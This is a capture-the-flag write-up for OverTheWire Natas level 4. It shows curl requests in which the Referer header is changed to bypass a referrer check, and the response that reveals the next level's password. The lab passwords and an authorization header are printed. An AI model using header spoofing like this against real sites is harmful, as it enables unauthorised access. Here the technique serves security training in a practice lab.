# Level 3-4

LINK : http://overthewire.org/wargames/natas/natas4.html

![](Screenshot from 2018-12-16 11-22-12.png)



 Seems we just have to change Referer, lets try out



This is the request going through browser 

```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://natas4.natas.labs.overthewire.org/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Cookie: __cfduid=db3dcdb049e929c04c7586b0959a8901e1544885701; __utmc=176859643; __utmz=176859643.1544885699.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.1354877644.1544885699.1544900570.1544937978.3; __utmt=1; __utmb=176859643.6.10.1544937978' --compressed
```

where we want to change Referer header to natas5

```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://natas5.natas.labs.overthewire.org/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Cookie: __cfduid=db3dcdb049e929c04c7586b0959a8901e1544885701; __utmc=176859643; __utmz=176859643.1544885699.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.1354877644.1544885699.1544900570.1544937978.3; __utmt=1; __utmb=176859643.6.10.1544937978' --compressed
```

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

And here is the password